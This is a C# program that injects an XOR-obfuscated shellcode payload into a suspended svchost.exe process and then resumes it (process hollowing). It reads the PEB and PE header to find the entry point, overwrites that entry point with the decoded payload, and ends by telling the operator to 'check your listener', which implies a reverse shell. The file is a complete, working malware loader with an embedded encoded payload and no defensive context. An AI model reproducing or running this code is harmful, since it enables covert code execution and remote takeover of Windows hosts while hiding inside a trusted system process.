using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {
	    // Shellcode
byte[] buf = new byte[510] {0x70, 0xc4, 0x0f, 0x68, 0x7c, 0x64, 0x40, 0x8c, 0x8c, 0x8c, 0xcd, 0xdd, 0xcd, 0xdc, 0xde, 0xc4, 0xbd, 0x5e, 0xe9, 0xc4, 0x07, 0xde, 0xec, 0xc4, 0x07, 0xde, 0x94, 0xc4, 0x07, 0xde, 0xac, 0xdd, 0xda, 0xc1, 0xbd, 0x45, 0xc4, 0x07, 0xfe, 0xdc, 0xc4, 0x83, 0x3b, 0xc6, 0xc6, 0xc4, 0xbd, 0x4c, 0x20, 0xb0, 0xed, 0xf0, 0x8e, 0xa0, 0xac, 0xcd, 0x4d, 0x45, 0x81, 0xcd, 0x8d, 0x4d, 0x6e, 0x61, 0xde, 0xcd, 0xdd, 0xc4, 0x07, 0xde, 0xac, 0x07, 0xce, 0xb0, 0xc4, 0x8d, 0x5c, 0xea, 0x0d, 0xf4, 0x94, 0x87, 0x8e, 0x83, 0x09, 0xfe, 0x8c, 0x8c, 0x8c, 0x07, 0x0c, 0x04, 0x8c, 0x8c, 0x8c, 0xc4, 0x09, 0x4c, 0xf8, 0xeb, 0xc4, 0x8d, 0x5c, 0xdc, 0xc8, 0x07, 0xcc, 0xac, 0xc5, 0x8d, 0x5c, 0x07, 0xc4, 0x94, 0x6f, 0xda, 0xc1, 0xbd, 0x45, 0xc4, 0x73, 0x45, 0xcd, 0x07, 0xb8, 0x04, 0xc4, 0x8d, 0x5a, 0xc4, 0xbd, 0x4c, 0x20, 0xcd, 0x4d, 0x45, 0x81, 0xcd, 0x8d, 0x4d, 0xb4, 0x6c, 0xf9, 0x7d, 0xc0, 0x8f, 0xc0, 0xa8, 0x84, 0xc9, 0xb5, 0x5d, 0xf9, 0x54, 0xd4, 0xc8, 0x07, 0xcc, 0xa8, 0xc5, 0x8d, 0x5c, 0xea, 0xcd, 0x07, 0x80, 0xc4, 0xc8, 0x07, 0xcc, 0x90, 0xc5, 0x8d, 0x5c, 0xcd, 0x07, 0x88, 0x04, 0xc4, 0x8d, 0x5c, 0xcd, 0xd4, 0xcd, 0xd4, 0xd2, 0xd5, 0xd6, 0xcd, 0xd4, 0xcd, 0xd5, 0xcd, 0xd6, 0xc4, 0x0f, 0x60, 0xac, 0xcd, 0xde, 0x73, 0x6c, 0xd4, 0xcd, 0xd5, 0xd6, 0xc4, 0x07, 0x9e, 0x65, 0xc7, 0x73, 0x73, 0x73, 0xd1, 0xc5, 0x32, 0xfb, 0xff, 0xbe, 0xd3, 0xbf, 0xbe, 0x8c, 0x8c, 0xcd, 0xda, 0xc5, 0x05, 0x6a, 0xc4, 0x0d, 0x60, 0x2c, 0x8d, 0x8c, 0x8c, 0xc5, 0x05, 0x69, 0xc5, 0x30, 0x8e, 0x8c, 0x8d, 0x37, 0x4c, 0x24, 0xa1, 0x47, 0xcd, 0xd8, 0xc5, 0x05, 0x68, 0xc0, 0x05, 0x7d, 0xcd, 0x36, 0xc0, 0xfb, 0xaa, 0x8b, 0x73, 0x59, 0xc0, 0x05, 0x66, 0xe4, 0x8d, 0x8d, 0x8c, 0x8c, 0xd5, 0xcd, 0x36, 0xa5, 0x0c, 0xe7, 0x8c, 0x73, 0x59, 0xe6, 0x86, 0xcd, 0xd2, 0xdc, 0xdc, 0xc1, 0xbd, 0x45, 0xc1, 0xbd, 0x4c, 0xc4, 0x73, 0x4c, 0xc4, 0x05, 0x4e, 0xc4, 0x73, 0x4c, 0xc4, 0x05, 0x4d, 0xcd, 0x36, 0x66, 0x83, 0x53, 0x6c, 0x73, 0x59, 0xc4, 0x05, 0x4b, 0xe6, 0x9c, 0xcd, 0xd4, 0xc0, 0x05, 0x6e, 0xc4, 0x05, 0x75, 0xcd, 0x36, 0x15, 0x29, 0xf8, 0xed, 0x73, 0x59, 0x09, 0x4c, 0xf8, 0x86, 0xc5, 0x73, 0x42, 0xf9, 0x69, 0x64, 0x1f, 0x8c, 0x8c, 0x8c, 0xc4, 0x0f, 0x60, 0x9c, 0xc4, 0x05, 0x6e, 0xc1, 0xbd, 0x45, 0xe6, 0x88, 0xcd, 0xd4, 0xc4, 0x05, 0x75, 0xcd, 0x36, 0x8e, 0x55, 0x44, 0xd3, 0x73, 0x59, 0x0f, 0x74, 0x8c, 0xf2, 0xd9, 0xc4, 0x0f, 0x48, 0xac, 0xd2, 0x05, 0x7a, 0xe6, 0xcc, 0xcd, 0xd5, 0xe4, 0x8c, 0x9c, 0x8c, 0x8c, 0xcd, 0xd4, 0xc4, 0x05, 0x7e, 0xc4, 0xbd, 0x45, 0xcd, 0x36, 0xd4, 0x28, 0xdf, 0x69, 0x73, 0x59, 0xc4, 0x05, 0x4f, 0xc5, 0x05, 0x4b, 0xc1, 0xbd, 0x45, 0xc5, 0x05, 0x7c, 0xc4, 0x05, 0x56, 0xc4, 0x05, 0x75, 0xcd, 0x36, 0x8e, 0x55, 0x44, 0xd3, 0x73, 0x59, 0x0f, 0x74, 0x8c, 0xf1, 0xa4, 0xd4, 0xcd, 0xdb, 0xd5, 0xe4, 0x8c, 0xcc, 0x8c, 0x8c, 0xcd, 0xd4, 0xe6, 0x8c, 0xd6, 0xcd, 0x36, 0x87, 0xa3, 0x83, 0xbc, 0x73, 0x59, 0xdb, 0xd5, 0xcd, 0x36, 0xf9, 0xe2, 0xc1, 0xed, 0x73, 0x59, 0xc5, 0x73, 0x42, 0x65, 0xb0, 0x73, 0x73, 0x73, 0xc4, 0x8d, 0x4f, 0xc4, 0xa5, 0x4a, 0xc4, 0x09, 0x7a, 0xf9, 0x38, 0xcd, 0x73, 0x6b, 0xd4, 0xe6, 0x8c, 0xd5, 0xc5, 0x4b, 0x4e, 0x7c, 0x39, 0x2e, 0xda, 0x73, 0x59};
	    // End Shellcode


            // Decoding 
// XOR decoding
for (int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(buf[i] ^ 0x8c);
}
	    // End Decoding


            // Start 'svchost.exe' in a suspended state
            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
            Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");

            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
            Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");

            // Get entry point of the actual process executable
            // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
            // From the PEB (address we got in last call), we have to do the following:
            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!

            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            Console.WriteLine($"DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");

            // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
            Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");

            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            uint rvaOffset = e_lfanew + 0x28;
            Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");

            // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            Console.WriteLine($"DEBUG: RVA value: {"0x" + rva.ToString("x")}.");

            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
            Console.WriteLine($"Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");

            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
            Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");

            // Resume the thread to trigger our payload
            uint rResult = ResumeThread(pInfo.hThread);
            Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
        }
    }
}
